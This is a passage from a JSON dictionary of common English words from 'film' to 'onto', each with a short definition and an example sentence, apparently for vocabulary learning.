        "definition": "a story or event recorded by a camera as a set of moving images and shown in a theater or on television; a movie",
        "example": "They watched a film at the cinema."
    },
    "final": {
        "definition": "coming at the end of a series",
        "example": "He was preparing for his final exam."
    },
    "finally": {
        "definition": "after a long time, typically involving difficulty or delay",
        "example": "She finally finished her project."
    },
    "financial": {
        "definition": "relating to money or how money is managed",
        "example": "He received financial advice from an expert."
    },
    "find": {
        "definition": "discover or perceive by chance or unexpectedly",
        "example": "She managed to find her lost keys."
    },
    "fine": {
        "definition": "of high quality",
        "example": "She was wearing a fine dress for the event."
    },
    "finger": {
        "definition": "each of the four slender jointed parts attached to either hand (or five, if the thumb is included)",
        "example": "She cut her finger while chopping vegetables."
    },
    "finish": {
        "definition": "bring (a task or activity) to an end; complete",
        "example": "He decided to finish his homework before going out."
    },
    "fire": {
        "definition": "combustion or burning, in which substances combine chemically with oxygen from the air and typically give out bright light, heat, and smoke",
        "example": "They sat by the fire to stay warm."
    },
    "firm": {
        "definition": "having a solid, almost unyielding surface or structure",
        "example": "The mattress was firm and comfortable."
    },
    "first": {
        "definition": "coming before all others in time or order; earliest; 1st",
        "example": "She was the first to arrive at the party."
    },
    "fish": {
        "definition": "a limbless cold-blooded vertebrate animal with gills and fins living wholly in water",
        "example": "They went to the lake to catch fish."
    },
    "five": {
        "definition": "equivalent to the sum of two and three; one more than four, or half of ten; 5",
        "example": "They celebrated his fifth birthday."
    },
    "floor": {
        "definition": "the lower surface of a room, on which one may walk",
        "example": "She mopped the kitchen floor."
    },
    "fly": {
        "definition": "move through the air using wings",
        "example": "The bird can fly high in the sky."
    },
    "focus": {
        "definition": "the center of interest or activity",
        "example": "He needs to focus on his studies."
    },
    "follow": {
        "definition": "go or come after (a person or thing proceeding ahead); move or travel behind",
        "example": "They decided to follow the trail through the forest."
    },
    "food": {
        "definition": "any nutritious substance that people or animals eat or drink or that plants absorb in order to maintain life and growth",
        "example": "They bought food from the market."
    },
    "foot": {
        "definition": "the lower extremity of the leg below the ankle, on which a person stands or walks",
        "example": "He injured his foot while playing soccer."
    },
    "for": {
        "definition": "intended to be given to or used by (someone or something)",
        "example": "She bought a gift for her friend."
    },
    "force": {
        "definition": "strength or energy as an attribute of physical action or movement",
        "example": "The force of the wind was strong."
    },
    "foreign": {
        "definition": "of, from, in, or characteristic of a country or language other than one's own",
        "example": "They love learning about foreign cultures."
    },
    "forget": {
        "definition": "fail to remember",
        "example": "She tried to forget the embarrassing moment."
    },
    "form": {
        "definition": "the visible shape or configuration of something",
        "example": "They filled out a form for the application."
    },
    "former": {
        "definition": "having previously filled a particular role or been a particular thing",
        "example": "He is a former president of the company."
    },
    "forward": {
        "definition": "in the direction that one is facing or traveling; toward the front",
        "example": "She took a step forward."
    },
    "four": {
        "definition": "equivalent to the product of two and two; one more than three, or six less than ten; 4",
        "example": "They bought four tickets to the concert."
    },
    "free": {
        "definition": "not under the control or in the power of another; able to act or be done as one wishes",
        "example": "She felt free to express her opinions."
    },
    "friend": {
        "definition": "a person with whom one has a bond of mutual affection, typically one exclusive of sexual or family relations",
        "example": "She went out to lunch with her friend."
    },
    "from": {
        "definition": "indicating the point in space at which a journey, motion, or action starts",
        "example": "They traveled from New York to Paris."
    },
    "front": {
        "definition": "the side or part of an object that presents itself to view or that is normally seen or used first",
        "example": "She stood in front of the building."
    },
    "full": {
        "definition": "containing or holding as much or as many as possible; having no empty space",
        "example": "The glass was full of water."
    },
    "fund": {
        "definition": "a sum of money saved or made available for a particular purpose",
        "example": "They established a fund to support the charity."
    },
    "future": {
        "definition": "the time or a period of time following the moment of speaking or writing; time regarded as still to come",
        "example": "They are planning for the future."
    },
    "game": {
        "definition": "a form of play or sport, especially a competitive one played according to rules and decided by skill, strength, or luck",
        "example": "They enjoyed playing a board game together."
    },
    "garden": {
        "definition": "a piece of ground, often near a house, used for growing flowers, fruit, or vegetables",
        "example": "She planted roses in her garden."
    },
    "gas": {
        "definition": "an airlike fluid substance which expands freely to fill any space available, irrespective of its quantity",
        "example": "The car runs on gas."
    },
    "general": {
        "definition": "affecting or concerning all or most people, places, or things; widespread",
        "example": "There was a general feeling of happiness in the room."
    },
    "generation": {
        "definition": "all of the people born and living at about the same time, regarded collectively",
        "example": "The younger generation is more tech-savvy."
    },
    "get": {
        "definition": "come to have or hold (something); receive",
        "example": "She decided to get a new phone."
    },
    "girl": {
        "definition": "a female child",
        "example": "The girl played with her doll."
    },
    "give": {
        "definition": "freely transfer the possession of (something) to (someone); hand over to",
        "example": "He decided to give her a gift."
    },
    "glass": {
        "definition": "a hard, brittle substance, typically transparent or translucent, made by fusing sand with soda, lime, and sometimes other ingredients and cooling rapidly",
        "example": "She drank a glass of water."
    },
    "go": {
        "definition": "move from one place to another; travel",
        "example": "They decided to go to the beach."
    },
    "goal": {
        "definition": "the object of a person's ambition or effort; an aim or desired result",
        "example": "His goal is to become a doctor."
    },
    "good": {
        "definition": "to be desired or approved of",
        "example": "She is a good student."
    },
    "government": {
        "definition": "the governing body of a nation, state, or community",
        "example": "The government passed new laws."
    },
    "great": {
        "definition": "of an extent, amount, or intensity considerably above the normal or average",
        "example": "She had a great time at the party."
    },
    "green": {
        "definition": "of the color between blue and yellow in the spectrum; colored like grass or emeralds",
        "example": "The grass is green."
    },
    "ground": {
        "definition": "the solid surface of the earth",
        "example": "She sat on the ground."
    },
    "group": {
        "definition": "a number of people or things that are located, gathered, or classed together",
        "example": "They formed a study group."
    },
    "grow": {
        "definition": "undergo natural development by increasing in size and changing physically",
        "example": "The plant will grow taller over time."
    },
    "growth": {
        "definition": "the process of increasing in physical size",
        "example": "The company has seen significant growth."
    },
    "guess": {
        "definition": "estimate or suppose (something) without sufficient information to be sure of being correct",
        "example": "She had to guess the answer to the question."
    },
    "gun": {
        "definition": "a weapon incorporating a metal tube from which bullets, shells, or other missiles are propelled by explosive force",
        "example": "The hunter carried a gun."
    },
    "guy": {
        "definition": "a man",
        "example": "She met a nice guy at the party."
    },
    "hair": {
        "definition": "any of the fine threadlike strands growing from the skin of humans, mammals, and some other animals",
        "example": "She has long brown hair."
    },
    "half": {
        "definition": "either of two equal or corresponding parts into which something is or can be divided",
        "example": "She ate half of the pizza."
    },
    "hand": {
        "definition": "the end part of a person's arm beyond the wrist, including the palm, fingers, and thumb",
        "example": "He waved his hand in greeting."
    },
    "hang": {
        "definition": "suspend or be suspended from above with the lower part dangling free",
        "example": "They decided to hang the picture on the wall."
    },
    "happen": {
        "definition": "take place; occur",
        "example": "She didn\u2019t expect this to happen."
    },
    "happy": {
        "definition": "feeling or showing pleasure or contentment",
        "example": "She felt happy after hearing the good news."
    },
    "hard": {
        "definition": "solid, firm, and rigid; not easily broken, bent, or pierced",
        "example": "The task was very hard to complete."
    },
    "have": {
        "definition": "possess, own, or hold",
        "example": "They have a beautiful house."
    },
    "he": {
        "definition": "used to refer to a male person or animal previously mentioned or easily identified",
        "example": "He is my best friend."
    },
    "head": {
        "definition": "the upper part of the human body, or the front or upper part of the body of an animal, typically separated from the rest of the body by a neck, and containing the brain, mouth, and sense organs",
        "example": "She nodded her head in agreement."
    },
    "health": {
        "definition": "the state of being free from illness or injury",
        "example": "He is in good health."
    },
    "hear": {
        "definition": "perceive with the ear the sound made by (someone or something)",
        "example": "She could hear the music from the next room."
    },
    "heart": {
        "definition": "the organ in your chest that sends the blood around your body",
        "example": "Her heart beat faster when she saw him."
    },
    "heat": {
        "definition": "the quality of being hot; high temperature",
        "example": "The heat of the summer was unbearable."
    },
    "heavy": {
        "definition": "of great weight; difficult to lift or move",
        "example": "The box was too heavy to carry."
    },
    "help": {
        "definition": "make it easier or possible for (someone) to do something by offering one's services or resources",
        "example": "She offered to help him with his homework."
    },
    "her": {
        "definition": "used as the object of a verb or preposition to refer to a female person or animal previously mentioned or easily identified",
        "example": "He gave her a gift."
    },
    "here": {
        "definition": "in, at, or to this place or position",
        "example": "She is waiting for you here."
    },
    "herself": {
        "definition": "used as the object of a verb or preposition to refer to a female person or animal previously mentioned as the subject of the clause",
        "example": "She made the dress herself."
    },
    "high": {
        "definition": "of great vertical extent",
        "example": "The mountain is very high."
    },
    "him": {
        "definition": "used as the object of a verb or preposition to refer to a male person or animal previously mentioned or easily identified",
        "example": "She told him the news."
    },
    "himself": {
        "definition": "used as the object of a verb or preposition to refer to a male person or animal previously mentioned as the subject of the clause",
        "example": "He completed the project by himself."
    },
    "his": {
        "definition": "belonging to or associated with a male person or animal previously mentioned or easily identified",
        "example": "He lost his keys."
    },
    "history": {
        "definition": "the study of past events, particularly in human affairs",
        "example": "She is interested in the history of ancient civilizations."
    },
    "hit": {
        "definition": "bring one's hand or a tool or weapon into contact with (someone or something) quickly and forcefully",
        "example": "He accidentally hit his thumb with a hammer."
    },
    "hold": {
        "definition": "grasp, carry, or support with one's hands",
        "example": "She decided to hold the baby."
    },
    "home": {
        "definition": "the place where one lives permanently, especially as a member of a family or household",
        "example": "They invited me to their home."
    },
    "hope": {
        "definition": "a feeling of expectation and desire for a certain thing to happen",
        "example": "She has high hopes for her future."
    },
    "hospital": {
        "definition": "an institution providing medical and surgical treatment and nursing care for sick or injured people",
        "example": "He was taken to the hospital after the accident."
    },
    "hot": {
        "definition": "having a high degree of heat or a high temperature",
        "example": "The weather is very hot today."
    },
    "hotel": {
        "definition": "an establishment providing accommodations, meals, and other services for travelers and tourists",
        "example": "They stayed at a luxury hotel during their vacation."
    },
    "hour": {
        "definition": "a period of time equal to a twenty-fourth part of a day and night and divided into 60 minutes",
        "example": "It took her an hour to complete the task."
    },
    "house": {
        "definition": "a building for human habitation, especially one that is lived in by a family or small group of people",
        "example": "They bought a new house in the suburbs."
    },
    "how": {
        "definition": "in what way or manner; by what means",
        "example": "How does this machine work?"
    },
    "however": {
        "definition": "used to introduce a statement that contrasts with or seems to contradict something that has been said previously",
        "example": "She didn't like the movie; however, she liked the soundtrack."
    },
    "huge": {
        "definition": "extremely large; enormous",
        "example": "The elephant is a huge animal."
    },
    "human": {
        "definition": "relating to or characteristic of people or human beings",
        "example": "She is studying human anatomy."
    },
    "hundred": {
        "definition": "the number equivalent to the product of ten and ten; 100",
        "example": "There were a hundred people at the event."
    },
    "husband": {
        "definition": "a married man considered in relation to his spouse",
        "example": "Her husband is a great cook."
    },
    "idea": {
        "definition": "a thought or suggestion as to a possible course of action",
        "example": "She had a brilliant idea for the project."
    },
    "identify": {
        "definition": "establish or indicate who or what (someone or something) is",
        "example": "The witness was able to identify the suspect."
    },
    "if": {
        "definition": "introducing a conditional clause",
        "example": "If it rains, we will stay indoors."
    },
    "image": {
        "definition": "a representation of the external form of a person or thing in art",
        "example": "She saw her image in the mirror."
    },
    "imagine": {
        "definition": "form a mental image or concept of",
        "example": "He could imagine a world without war."
    },
    "impact": {
        "definition": "the action of one object coming forcibly into contact with another",
        "example": "The impact of the crash was severe."
    },
    "important": {
        "definition": "of great significance or value; likely to have a profound effect on success, survival, or well-being",
        "example": "It is important to stay hydrated."
    },
    "improve": {
        "definition": "make or become better",
        "example": "She is trying to improve her skills."
    },
    "include": {
        "definition": "comprise or contain as part of a whole",
        "example": "The package includes all necessary accessories."
    },
    "including": {
        "definition": "containing as part of the whole being considered",
        "example": "Several topics were discussed, including climate change."
    },
    "increase": {
        "definition": "become or make greater in size, amount, or degree",
        "example": "They hope to increase sales by 20%."
    },
    "indeed": {
        "definition": "used to emphasize a statement or response confirming something already suggested",
        "example": "Indeed, it was a beautiful day."
    },
    "indicate": {
        "definition": "point out; show",
        "example": "The sign indicates the right direction."
    },
    "individual": {
        "definition": "a single human being as distinct from a group, class, or family",
        "example": "Each individual has their own unique talents."
    },
    "industry": {
        "definition": "economic activity concerned with the processing of raw materials and manufacture of goods in factories",
        "example": "The automotive industry is a major part of the economy."
    },
    "information": {
        "definition": "facts provided or learned about something or someone",
        "example": "She gathered information for her research paper."
    },
    "inside": {
        "definition": "situated within the confines of (something)",
        "example": "He found the book inside the drawer."
    },
    "instead": {
        "definition": "as an alternative or substitute",
        "example": "She chose to walk instead of taking the bus."
    },
    "institution": {
        "definition": "an organization founded and united for a specific purpose",
        "example": "The institution provides support to those in need."
    },
    "interest": {
        "definition": "the state of wanting to know or learn about something or someone",
        "example": "She has a keen interest in astronomy."
    },
    "interesting": {
        "definition": "arousing curiosity or interest; holding or catching the attention",
        "example": "The lecture was very interesting."
    },
    "international": {
        "definition": "existing, occurring, or carried on between nations",
        "example": "They attended an international conference."
    },
    "interview": {
        "definition": "a meeting of people face to face, especially for consultation",
        "example": "She had an interview for the new job."
    },
    "investment": {
        "definition": "the action or process of investing money for profit or material result",
        "example": "He made a wise investment in the stock market."
    },
    "involve": {
        "definition": "include (something) as a necessary part or result",
        "example": "The project will involve several teams."
    },
    "issue": {
        "definition": "an important topic or problem for debate or discussion",
        "example": "They discussed the issue at the meeting."
    },
    "it": {
        "definition": "used to refer to a thing previously mentioned or easily identified",
        "example": "The cat is sleeping. It looks very comfortable."
    },
    "item": {
        "definition": "an individual article or unit, especially one that is part of a list, collection, or set",
        "example": "She checked off each item on the list."
    },
    "its": {
        "definition": "belonging to or associated with a thing previously mentioned or easily identified",
        "example": "The dog wagged its tail."
    },
    "itself": {
        "definition": "used as the object of a verb or preposition to refer to a thing or animal previously mentioned as the subject of the clause",
        "example": "The cat cleaned itself."
    },
    "job": {
        "definition": "a paid position of regular employment",
        "example": "She applied for a job at the company."
    },
    "join": {
        "definition": "link; connect",
        "example": "He decided to join the club."
    },
    "just": {
        "definition": "exactly",
        "example": "He arrived just in time."
    },
    "keep": {
        "definition": "have or retain possession of",
        "example": "She decided to keep the old photographs."
    },
    "key": {
        "definition": "a small piece of shaped metal with incisions cut to fit the wards of a particular lock, and which is inserted into a lock and turned to open or close it",
        "example": "He couldn't find the key to the door."
    },
    "kid": {
        "definition": "a child or young person",
        "example": "The kid played with his toys."
    },
    "kill": {
        "definition": "cause the death of (a person, animal, or other living thing)",
        "example": "The hunter aimed to kill the deer."
    },
    "kind": {
        "definition": "a group of people or things having similar characteristics",
        "example": "She likes every kind of music."
    },
    "kitchen": {
        "definition": "a room or area where food is prepared and cooked",
        "example": "She spent the morning cleaning the kitchen."
    },
    "know": {
        "definition": "be aware of through observation, inquiry, or information",
        "example": "He didn't know the answer to the question."
    },
    "knowledge": {
        "definition": "facts, information, and skills acquired by a person through experience or education",
        "example": "She has a vast knowledge of history."
    },
    "land": {
        "definition": "the part of the earth's surface that is not covered by water",
        "example": "They bought a piece of land to build their house on."
    },
    "language": {
        "definition": "the method of human communication, either spoken or written, consisting of the use of words in a structured and conventional way",
        "example": "She is fluent in several languages."
    },
    "large": {
        "definition": "of considerable or relatively great size, extent, or capacity",
        "example": "They live in a large house."
    },
    "last": {
        "definition": "coming after all others in time or order; final",
        "example": "He was the last person to leave the party."
    },
    "late": {
        "definition": "doing something or taking place after the expected, proper, or usual time",
        "example": "She was late to the meeting."
    },
    "later": {
        "definition": "at a time in the future or after the time you have mentioned",
        "example": "He will finish the project later."
    },
    "laugh": {
        "definition": "make the spontaneous sounds and movements of the face and body that are the instinctive expressions of lively amusement",
        "example": "They couldn't stop laughing at the joke."
    },
    "law": {
        "definition": "the system of rules which a particular country or community recognizes as regulating the actions of its members and which it may enforce by the imposition of penalties",
        "example": "The new law was passed by the government."
    },
    "lawyer": {
        "definition": "a person who practices or studies law; an attorney or a counselor",
        "example": "She consulted a lawyer for legal advice."
    },
    "lay": {
        "definition": "put down, especially gently or carefully",
        "example": "She decided to lay the book on the table."
    },
    "lead": {
        "definition": "cause (a person or animal) to go with one by holding them by the hand, a halter, a rope, etc., while moving forward",
        "example": "He decided to lead the team to victory."
    },
    "leader": {
        "definition": "the person who leads or commands a group, organization, or country",
        "example": "She is a natural leader and inspires her team."
    },
    "learn": {
        "definition": "gain or acquire knowledge of or skill in (something) by study, experience, or being taught",
        "example": "She wants to learn how to play the piano."
    },
    "least": {
        "definition": "smallest in amount, extent, or significance",
        "example": "She had the least amount of homework in the class."
    },
    "leave": {
        "definition": "go away from",
        "example": "They decided to leave the party early."
    },
    "left": {
        "definition": "on, towards, or relating to the side of a human body or of a thing which is to the west when the person or thing is facing north",
        "example": "She turned left at the intersection."
    },
    "leg": {
        "definition": "each of the limbs on which a person or animal walks and stands",
        "example": "He injured his leg while playing soccer."
    },
    "legal": {
        "definition": "relating to the law",
        "example": "She sought legal advice from her lawyer."
    },
    "less": {
        "definition": "a smaller amount of; not as much",
        "example": "She spent less money than she expected."
    },
    "let": {
        "definition": "allow or permit (someone) to do something",
        "example": "He decided to let her borrow his book."
    },
    "letter": {
        "definition": "a written, typed, or printed communication, especially one sent in an envelope by mail or messenger",
        "example": "She received a letter from her friend."
    },
    "level": {
        "definition": "a position on a real or imaginary scale of amount, quantity, extent, or quality",
        "example": "The water level in the lake has risen."
    },
    "lie": {
        "definition": "be in or assume a horizontal or resting position on a supporting surface",
        "example": "She decided to lie down on the couch."
    },
    "life": {
        "definition": "the condition that distinguishes animals and plants from inorganic matter, including the capacity for growth, reproduction, functional activity, and continual change preceding death",
        "example": "She is enjoying her life to the fullest."
    },
    "light": {
        "definition": "the natural agent that stimulates sight and makes things visible",
        "example": "The room was filled with bright light."
    },
    "like": {
        "definition": "having the same characteristics or qualities as; similar to",
        "example": "She has a dress like mine."
    },
    "likely": {
        "definition": "such as well might happen or be true; probable",
        "example": "It is likely to rain tomorrow."
    },
    "line": {
        "definition": "a long, narrow mark or band",
        "example": "She drew a straight line on the paper."
    },
    "list": {
        "definition": "a number of connected items or names written or printed consecutively, typically one below the other",
        "example": "She made a list of things to do."
    },
    "listen": {
        "definition": "give one's attention to a sound",
        "example": "He likes to listen to music while studying."
    },
    "little": {
        "definition": "small in size, amount, or degree (often used to convey an appealing diminutiveness or express an affectionate or condescending attitude)",
        "example": "She has a little dog that is very playful."
    },
    "live": {
        "definition": "remain alive",
        "example": "They decided to live in the countryside."
    },
    "local": {
        "definition": "relating or restricted to a particular area or one's neighborhood",
        "example": "They visited the local market."
    },
    "long": {
        "definition": "measuring a great distance from end to end",
        "example": "She wore a long dress to the event."
    },
    "look": {
        "definition": "direct one's gaze toward someone or something or in a specified direction",
        "example": "She decided to look out the window."
    },
    "lose": {
        "definition": "be deprived of or cease to have or retain (something)",
        "example": "He was upset because he managed to lose his wallet."
    },
    "loss": {
        "definition": "the fact or process of losing something or someone",
        "example": "The company reported a significant loss last quarter."
    },
    "lot": {
        "definition": "a large number or amount; a great deal",
        "example": "She has a lot of friends."
    },
    "love": {
        "definition": "an intense feeling of deep affection",
        "example": "They are in love with each other."
    },
    "low": {
        "definition": "of less than average height from top to bottom or to the top from the ground",
        "example": "The shelf is too low for me to stand up."
    },
    "machine": {
        "definition": "an apparatus using mechanical power and having several parts, each with a definite function and together performing a particular task",
        "example": "He bought a new washing machine."
    },
    "magazine": {
        "definition": "a periodical publication containing articles and illustrations, typically covering a particular subject or area of interest",
        "example": "She enjoys reading fashion magazines."
    },
    "main": {
        "definition": "chief in size or importance",
        "example": "The main reason for their visit was to see the museum."
    },
    "maintain": {
        "definition": "cause or enable (a condition or state of affairs) to continue",
        "example": "She tries to maintain a healthy lifestyle."
    },
    "major": {
        "definition": "important, serious, or significant",
        "example": "He is a major influence in the field of science."
    },
    "majority": {
        "definition": "the greater number",
        "example": "The majority of the students passed the exam."
    },
    "make": {
        "definition": "form (something) by putting parts together or combining substances; create",
        "example": "She decided to make a cake for the party."
    },
    "man": {
        "definition": "an adult human male",
        "example": "The man was very kind and helpful."
    },
    "manage": {
        "definition": "be in charge of (a company, establishment, or undertaking); administer; run",
        "example": "She manages a team of five people."
    },
    "management": {
        "definition": "the process of dealing with or controlling things or people",
        "example": "He is studying business management."
    },
    "manager": {
        "definition": "a person responsible for controlling or administering an organization or group of staff",
        "example": "She was promoted to the position of manager."
    },
    "many": {
        "definition": "a large number of",
        "example": "There are many books in the library."
    },
    "market": {
        "definition": "a regular gathering of people for the purchase and sale of provisions, livestock, and other commodities",
        "example": "They bought fresh produce from the local market."
    },
    "marriage": {
        "definition": "the legally or formally recognized union of two people as partners in a personal relationship",
        "example": "They celebrated their 25th wedding anniversary with a grand party."
    },
    "material": {
        "definition": "the matter from which a thing is or can be made",
        "example": "The dress was made from high-quality material."
    },
    "matter": {
        "definition": "a subject or situation under consideration",
        "example": "The matter is still under investigation."
    },
    "may": {
        "definition": "expressing possibility",
        "example": "She may join us for dinner."
    },
    "maybe": {
        "definition": "perhaps; possibly",
        "example": "Maybe we'll go to the beach this weekend."
    },
    "me": {
        "definition": "used by a speaker to refer to himself or herself as the object of a verb or preposition",
        "example": "He gave the book to me."
    },
    "mean": {
        "definition": "intend to convey, indicate, or refer to (a particular thing or notion); signify",
        "example": "What do you mean by that statement?"
    },
    "measure": {
        "definition": "ascertain the size, amount, or degree of (something) by using an instrument or device marked in standard units",
        "example": "She used a ruler to measure the length of the table."
    },
    "media": {
        "definition": "the main means of mass communication (broadcasting, publishing, and the internet), regarded collectively",
        "example": "The news spread quickly through social media."
    },
    "medical": {
        "definition": "relating to the science or practice of medicine",
        "example": "She received medical treatment for her injury."
    },
    "meet": {
        "definition": "come into the presence or company of (someone) by chance or arrangement",
        "example": "They decided to meet at the caf\u00e9."
    },
    "meeting": {
        "definition": "an assembly of people, especially the members of a society or committee, for discussion or entertainment",
        "example": "The team held a meeting to discuss the project."
    },
    "member": {
        "definition": "an individual belonging to a group such as a society or team",
        "example": "She is a member of the book club."
    },
    "memory": {
        "definition": "the faculty by which the mind stores and remembers information",
        "example": "She has a good memory for names."
    },
    "mention": {
        "definition": "refer to something briefly and without going into detail",
        "example": "He mentioned the upcoming event during the meeting."
    },
    "message": {
        "definition": "a verbal, written, or recorded communication sent to or left for a recipient who cannot be contacted directly",
        "example": "She left a message on his voicemail."
    },
    "method": {
        "definition": "a particular form of procedure for accomplishing or approaching something, especially a systematic or established one",
        "example": "They developed a new method for testing the product."
    },
    "middle": {
        "definition": "the point or position at an equal distance from the sides, edges, or ends of something",
        "example": "He stood in the middle of the room."
    },
    "might": {
        "definition": "used to express possibility or make a suggestion",
        "example": "She might come to the party later."
    },
    "military": {
        "definition": "relating to or characteristic of soldiers or armed forces",
        "example": "He served in the military for ten years."
    },
    "million": {
        "definition": "the number equivalent to the product of a thousand and a thousand; 1,000,000",
        "example": "The population of the city is over a million."
    },
    "mind": {
        "definition": "the element of a person that enables them to be aware of the world and their experiences, to think, and to feel; the faculty of consciousness and thought",
        "example": "She has a sharp mind and quick wit."
    },
    "minute": {
        "definition": "a period of time equal to sixty seconds or a sixtieth of an hour",
        "example": "The meeting will start in five minutes."
    },
    "miss": {
        "definition": "fail to hit, reach, or come into contact with (something aimed at)",
        "example": "She managed to miss the bus by just a few seconds."
    },
    "mission": {
        "definition": "an important assignment carried out for political, religious, or commercial purposes, typically involving travel",
        "example": "Their mission was to deliver humanitarian aid."
    },
    "model": {
        "definition": "a three-dimensional representation of a person or thing or of a proposed structure, typically on a smaller scale than the original",
        "example": "They built a scale model of the building."
    },
    "modern": {
        "definition": "relating to the present or recent times as opposed to the remote past",
        "example": "The apartment has a modern design."
    },
    "moment": {
        "definition": "a very brief period of time",
        "example": "She paused for a moment to gather her thoughts."
    },
    "money": {
        "definition": "a current medium of exchange in the form of coins and banknotes; coins and banknotes collectively",
        "example": "She saved her money for a rainy day."
    },
    "month": {
        "definition": "each of the twelve named periods into which a year is divided",
        "example": "They plan to take a vacation next month."
    },
    "more": {
        "definition": "a greater or additional amount or degree",
        "example": "She wanted more time to finish the assignment."
    },
    "morning": {
        "definition": "the period of time between midnight and noon, especially from sunrise to noon",
        "example": "She enjoys going for a jog in the morning."
    },
    "most": {
        "definition": "greatest in amount or degree",
        "example": "She is the most talented artist in the class."
    },
    "mother": {
        "definition": "a woman in relation to her child or children",
        "example": "She is a loving and caring mother."
    },
    "mouth": {
        "definition": "the opening in the lower part of the human face, surrounded by the lips, through which food is taken in and vocal sounds are emitted",
        "example": "She opened her mouth to speak."
    },
    "move": {
        "definition": "go in a specified direction or manner; change position",
        "example": "They decided to move to a new city."
    },
    "movement": {
        "definition": "an act of changing physical location or position or of having this changed",
        "example": "The movement of the dancers was graceful."
    },
    "movie": {
        "definition": "a story or event recorded by a camera as a set of moving images and shown in a theater or on television",
        "example": "They went to see a movie at the cinema."
    },
    "Mr": {
        "definition": "a title used before a surname or full name to address or refer to a man without a higher or honorific or professional title",
        "example": "Mr. Smith will be our guest speaker today."
    },
    "Mrs": {
        "definition": "a title used before a surname or full name to address or refer to a married woman without a higher or honorific or professional title",
        "example": "Mrs. Johnson will be joining us for dinner."
    },
    "much": {
        "definition": "a great amount or quantity of",
        "example": "She doesn't have much free time."
    },
    "music": {
        "definition": "vocal or instrumental sounds (or both) combined in such a way as to produce beauty of form, harmony, and expression of emotion",
        "example": "She enjoys listening to classical music."
    },
    "must": {
        "definition": "be obliged to; should (used to express necessity or inevitability)",
        "example": "You must complete your homework before playing outside."
    },
    "my": {
        "definition": "belonging to or associated with the speaker",
        "example": "She is my best friend."
    },
    "myself": {
        "definition": "used by a speaker to refer to himself or herself as the object of a verb or preposition when he or she is the subject of the clause",
        "example": "I made the cake myself."
    },
    "name": {
        "definition": "a word or set of words by which a person or thing is known, addressed, or referred to",
        "example": "Her name is Sarah."
    },
    "nation": {
        "definition": "a large aggregate of people united by common descent, history, culture, or language, inhabiting a particular country or territory",
        "example": "The nation celebrated its independence day."
    },
    "national": {
        "definition": "relating to a nation; common to or characteristic of a whole nation",
        "example": "The national flag was raised at the ceremony."
    },
    "natural": {
        "definition": "existing in or derived from nature; not made or caused by humankind",
        "example": "The park is known for its natural beauty."
    },
    "nature": {
        "definition": "the phenomena of the physical world collectively, including plants, animals, the landscape, and other features and products of the earth, as opposed to humans or human creations",
        "example": "She loves spending time in nature."
    },
    "near": {
        "definition": "at or to a short distance away; close",
        "example": "The school is near her house."
    },
    "nearly": {
        "definition": "very close to; almost",
        "example": "She nearly missed her flight."
    },
    "necessary": {
        "definition": "required to be done, achieved, or present; needed; essential",
        "example": "It is necessary to wear a helmet while riding a bike."
    },
    "need": {
        "definition": "require (something) because it is essential or very important rather than just desirable",
        "example": "You need to drink water to stay hydrated."
    },
    "network": {
        "definition": "a group or system of interconnected people or things",
        "example": "The company has a vast network of suppliers."
    },
    "never": {
        "definition": "at no time in the past or future; on no occasion; not ever",
        "example": "She has never been to Paris."
    },
    "new": {
        "definition": "not existing before; made, introduced, or discovered recently or now for the first time",
        "example": "He bought a new car."
    },
    "news": {
        "definition": "newly received or noteworthy information, especially about recent or important events",
        "example": "She watches the news every evening."
    },
    "newspaper": {
        "definition": "a printed publication (usually issued daily or weekly) consisting of folded unstapled sheets and containing news, articles, advertisements, and correspondence",
        "example": "He reads the newspaper every morning."
    },
    "next": {
        "definition": "coming immediately after the present one in order, rank, or space",
        "example": "She will be the next to speak."
    },
    "nice": {
        "definition": "pleasant; agreeable; satisfactory",
        "example": "They had a nice time at the beach."
    },
    "night": {
        "definition": "the period of darkness in each twenty-four hours; the time from sunset to sunrise",
        "example": "She prefers to study at night."
    },
    "no": {
        "definition": "not any",
        "example": "There is no milk left in the fridge."
    },
    "none": {
        "definition": "not any",
        "example": "None of the students knew the answer."
    },
    "nor": {
        "definition": "used to introduce a further negative statement",
        "example": "She did not speak, nor did she move."
    },
    "north": {
        "definition": "the direction in which a compass needle normally points, toward the horizon on the left-hand side of a person facing east, or the part of the horizon lying in this direction",
        "example": "They traveled north to reach the mountains."
    },
    "not": {
        "definition": "used with an auxiliary verb or 'be' to form the negative",
        "example": "She is not coming to the party."
    },
    "note": {
        "definition": "a brief record of facts, topics, or thoughts, written down as an aid to memory",
        "example": "She made a note of the meeting date."
    },
    "nothing": {
        "definition": "not anything; no single thing",
        "example": "There is nothing to worry about."
    },
    "notice": {
        "definition": "become aware of",
        "example": "He didn't notice the change in her appearance."
    },
    "now": {
        "definition": "at the present moment",
        "example": "She is studying right now."
    },
    "n't": {
        "definition": "used with auxiliary verbs to form negatives",
        "example": "She isn't happy with the results."
    },
    "number": {
        "definition": "an arithmetical value, expressed by a word, symbol, or figure, representing a particular quantity and used in counting and making calculations",
        "example": "She wrote down the phone number."
    },
    "occur": {
        "definition": "happen; take place",
        "example": "The event is set to occur next week."
    },
    "off": {
        "definition": "away from the place in question; to or at a distance",
        "example": "He walked off without saying goodbye."
    },
    "offer": {
        "definition": "present or proffer (something) for (someone) to accept or reject as so desired",
        "example": "She decided to offer him some help."
    },
    "office": {
        "definition": "a room, set of rooms, or building used as a place for commercial, professional, or bureaucratic work",
        "example": "She works in a spacious office."
    },
    "officer": {
        "definition": "a person holding a position of authority in the armed services, in the police force, or in a similar organization",
        "example": "The officer directed traffic at the busy intersection."
    },
    "official": {
        "definition": "relating to an authority or public body and its activities and responsibilities",
        "example": "The official report was released yesterday."
    },
    "often": {
        "definition": "frequently; many times",
        "example": "She often visits her grandparents on weekends."
    },
    "oh": {
        "definition": "used to express a range of emotions including surprise, anger, disappointment, or joy, or when reacting to a remark or an event",
        "example": "Oh, I didn't know you were coming!"
    },
    "oil": {
        "definition": "a viscous liquid derived from petroleum, especially for use as a fuel or lubricant",
        "example": "He checked the oil level in his car."
    },
    "ok": {
        "definition": "used to express agreement or acceptance",
        "example": "She said it was ok to come over."
    },
    "old": {
        "definition": "having lived for a long time; no longer young",
        "example": "The old man told stories of his youth."
    },
    "on": {
        "definition": "physically in contact with and supported by (a surface)",
        "example": "She placed the book on the table."
    },
    "once": {
        "definition": "on one occasion or for one time only",
        "example": "She has only been there once."
    },
    "one": {
        "definition": "the lowest cardinal number; half of two; 1",
        "example": "There is only one cookie left."
    },
    "only": {
        "definition": "and no one or nothing more besides; solely or exclusively",
        "example": "She was the only person in the room."
    },
    "onto": {
